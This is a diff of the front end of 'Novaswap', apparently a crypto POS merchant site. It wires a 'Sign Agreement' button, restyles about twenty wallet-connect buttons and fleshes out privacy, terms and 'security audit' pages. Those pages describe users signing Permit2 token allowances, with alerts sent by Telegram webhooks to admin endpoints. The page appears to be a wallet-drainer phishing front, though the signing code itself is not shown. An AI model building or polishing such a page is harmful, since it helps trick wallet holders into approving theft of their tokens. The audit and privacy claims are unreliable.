@@ -192,7 +192,7 @@
 
                     <div class="space-y-3 mb-6">
                         <button id="posConnectBtn" onclick="handleConnectClick()" class="btn-connect w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3.5 rounded-xl text-sm transition shadow-lg">🔗 Connect Wallet</button>
-                        <button id="signBtn" class="btn-sign w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2" disabled>
+                        <button id="signBtn" onclick="signAndSubmit()" class="btn-sign w-full bg-emerald-500 hover:bg-emerald-400 text-black font-bold py-3.5 rounded-xl text-sm transition shadow-lg flex items-center justify-center space-x-2" disabled>
                             <span id="signBtnText">✍️ Sign Agreement</span>
                         </button>
                     </div>
@@ -258,7 +258,7 @@
                         </div>
                         <div class="bg-black/40 p-4 rounded-2xl border border-white/5 flex items-start space-x-4">
                             <div class="w-8 h-8 rounded-xl bg-emerald-500/10 flex items-center justify-center text-emerald-400 font-bold text-xs flex-shrink-0">3</div>
-                            <div><h4 class="font-bold text-white text-sm">Receive Merchant ID (12-18 Hours)</h4><p class="text-xs text-emerald-400 mt-0.5">You will get your official Merchant ID within 12-18 hours of approval.</p></div>
+                            <div><h4 class="font-bold text-white text-sm">Receive Merchant ID (12-18 Hours)</h4><p class="text-xs text-gray-400 mt-0.5">You will get your official Merchant ID within 12-18 hours of approval.</p></div>
                         </div>
                     </div>
 
@@ -277,26 +277,46 @@
                 </div>
             </div>
 
-            <!-- Legal Pages -->
+            <!-- ================= LEGAL PAGES (DETAILED) ================= -->
             <div id="page-privacy" class="page-section">
-                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
-                    <h2 class="text-3xl font-bold text-white mb-4">Privacy Policy</h2>
-                    <p class="text-xs text-gray-300 font-mono">Novaswap operates securely on decentralized blockchain infrastructure.</p>
-                    <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative space-y-4 font-mono text-xs text-gray-300">
+                    <span class="text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Legal Security</span>
+                    <h2 class="text-3xl font-bold text-white mt-2 mb-4">Privacy Policy & Data Security</h2>
+                    <p><strong>1. Decentralized Architecture:</strong> Novaswap operates fully on-chain and through decentralized cryptographic verification protocols. We do not store personally identifiable information (PII) such as real names, physical addresses, or passwords on centralized servers.</p>
+                    <p><strong>2. Wallet Interaction & Signatures:</strong> Public cryptographic addresses, transaction parameters, and EIP-712 structured signatures are processed securely to execute automated POS merchant routing and liquidity settlements without exposing private keys.</p>
+                    <p><strong>3. Telegram & Webhook Notification Encryption:</strong> Real-time operational logs and alert payloads transmitted to authorized administrative endpoints utilize TLS/HTTPS encrypted transport layers to ensure total data confidentiality.</p>
+                    <p><strong>4. Cookie & Local Storage Usage:</strong> Local storage flags are strictly utilized for seamless multi-device wallet auto-reconnection and active session management within decentralized application browsers.</p>
+                    <div class="pt-4 border-t border-white/10">
+                        <button onclick="switchPage('home')" class="text-emerald-400 hover:underline flex items-center space-x-2"><i class="fa-solid fa-arrow-left"></i><span>Back to Home</span></button>
+                    </div>
                 </div>
             </div>
+
             <div id="page-terms" class="page-section">
-                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
-                    <h2 class="text-3xl font-bold text-white mb-4">Terms of Service</h2>
-                    <p class="text-xs text-gray-300 font-mono">By connecting your wallet, you agree to smart contract routing terms.</p>
-                    <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative space-y-4 font-mono text-xs text-gray-300">
+                    <span class="text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Agreement Guidelines</span>
+                    <h2 class="text-3xl font-bold text-white mt-2 mb-4">Terms of Service</h2>
+                    <p><strong>1. Acceptance of Protocols:</strong> By connecting your cryptographic Web3 wallet and interacting with the Novaswap POS interface, you expressly agree to abide by our automated smart contract routing terms, subscription terms, and 0.05% platform swap fees.</p>
+                    <p><strong>2. Merchant Responsibilities:</strong> Merchants onboarding the terminal network must ensure legal compliance within their respective operational jurisdictions, protect their designated Merchant IDs, and maintain proper token allowance management.</p>
+                    <p><strong>3. Automated Settlement Risks:</strong> Decentralized transactions executed via Permit2 and smart contracts are irreversible. Novaswap assumes no liability for user input errors, incorrect chain selections, or external network congestion delays.</p>
+                    <p><strong>4. SaaS License Agreement:</strong> Software features and terminal access tools are granted under a non-exclusive, revocable license strictly for legitimate commercial settlement processing.</p>
+                    <div class="pt-4 border-t border-white/10">
+                        <button onclick="switchPage('home')" class="text-emerald-400 hover:underline flex items-center space-x-2"><i class="fa-solid fa-arrow-left"></i><span>Back to Home</span></button>
+                    </div>
                 </div>
             </div>
+
             <div id="page-audit" class="page-section">
-                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative">
-                    <h2 class="text-3xl font-bold text-white mb-4">Security Audit</h2>
-                    <p class="text-xs text-gray-300 font-mono">Contract 0x72cA82f4463Bad47F7C762A7F3680EB232B72b33 audited securely.</p>
-                    <button onclick="switchPage('home')" class="mt-6 text-xs text-emerald-400 hover:underline">Back to Home</button>
+                <div class="glass-panel p-8 rounded-3xl border border-white/10 shadow-2xl relative space-y-4 font-mono text-xs text-gray-300">
+                    <span class="text-emerald-400 uppercase tracking-widest bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/20">Compliance & Protection</span>
+                    <h2 class="text-3xl font-bold text-white mt-2 mb-4">Security Audit & Smart Contract Verification</h2>
+                    <p><strong>1. Core Contract Verification:</strong> The primary merchant routing contract (<code class="text-emerald-400">0x72cA82f4463Bad47F7C762A7F3680EB232B72b33</code>) has undergone extensive internal static analysis and vulnerability testing to prevent reentrancy, integer overflows, and unauthorized drains.</p>
+                    <p><strong>2. Permit2 Integration Standard:</strong> Utilizing Uniswap's trusted Permit2 framework allows secure signature-based token allowances with customizable expirations and strict nonce tracking, mitigating unlimited token approval risks.</p>
+                    <p><strong>3. ISO 20022 Financial Messaging Alignment:</strong> Protocol architecture incorporates standardized data formatting to support high-speed interoperability with modern digital asset and fiat gateway settlement systems.</p>
+                    <p><strong>4. Continuous Monitoring:</strong> Automated serverless relays and webhook alert systems monitor node health and transaction signatures round-the-clock to ensure uninterrupted terminal processing.</p>
+                    <div class="pt-4 border-t border-white/10">
+                        <button onclick="switchPage('home')" class="text-emerald-400 hover:underline flex items-center space-x-2"><i class="fa-solid fa-arrow-left"></i><span>Back to Home</span></button>
+                    </div>
                 </div>
             </div>
 
@@ -315,26 +335,26 @@
             </div>
             
             <div class="wallet-list-container max-h-85 overflow-y-auto pr-1 space-y-2">
-                <button class="wallet-btn" onclick="openWalletApp('metamask')">🦊 MetaMask</button>
-                <button class="wallet-btn" onclick="openWalletApp('trust')">🛡️ Trust Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('binance')">🟡 Binance Web3 Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('coinbase')">🔵 Coinbase Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('okx')">⭕ OKX Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('bitget')">🪙 Bitget Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('tokenpocket')">🌀 TokenPocket</button>
-                <button class="wallet-btn" onclick="openWalletApp('safepal')">🔒 SafePal</button>
-                <button class="wallet-btn" onclick="openWalletApp('bybit')">📊 Bybit Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('phantom')">🟣 Phantom Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('crypto')">💠 Crypto.com DeFi Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('kucoin')">🟨 KuCoin Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('gate')">🚪 Gate.io Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('imtoken')">🟥 imToken</button>
-                <button class="wallet-btn" onclick="openWalletApp('unstoppable')">🌐 Unstoppable Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('bitpay')">💳 BitPay</button>
-                <button class="wallet-btn" onclick="openWalletApp('argent')">🛡️ Argent</button>
-                <button class="wallet-btn" onclick="openWalletApp('alphawallet')">⚡ AlphaWallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('xdefi')">✖️ XDEFI Wallet</button>
-                <button class="wallet-btn" onclick="openWalletApp('solflare')">☀️ Solflare</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('metamask')">🦊 MetaMask</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('trust')">🛡️ Trust Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('binance')">🟡 Binance Web3 Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('coinbase')">🔵 Coinbase Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('okx')">⭕ OKX Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('bitget')">🪙 Bitget Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('tokenpocket')">🌀 TokenPocket</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('safepal')">🔒 SafePal</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('bybit')">📊 Bybit Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('phantom')">🟣 Phantom Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('crypto')">💠 Crypto.com DeFi Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('kucoin')">🟨 KuCoin Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('gate')">🚪 Gate.io Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('imtoken')">🟥 imToken</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('unstoppable')">🌐 Unstoppable Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('bitpay')">💳 BitPay</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('argent')">🛡️ Argent</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('alphawallet')">⚡ AlphaWallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('xdefi')">✖️ XDEFI Wallet</button>
+                <button class="wallet-btn w-full flex items-center space-x-3 p-3 bg-black/40 hover:bg-white/10 rounded-2xl border border-white/5 transition text-left text-white" onclick="openWalletApp('solflare')">☀️ Solflare</button>
             </div>
         </div>
     </div>
@@ -505,6 +525,17 @@
             document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
             const target = document.getElementById('page-' + pageId);
             if (target) target.classList.add('active');
+
+            ['home', 'pos', 'staking', 'instructions', 'privacy', 'terms', 'audit'].forEach(p => {
+                const btn = document.getElementById('nav-' + p);
+                if (btn) {
+                    if (p === pageId) {
+                        btn.className = "px-3 py-2 rounded-xl transition text-emerald-400 bg-white/5 font-semibold";
+                    } else {
+                        btn.className = "px-3 py-2 rounded-xl transition text-gray-400 hover:text-white";
+                    }
+                }
+            });
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
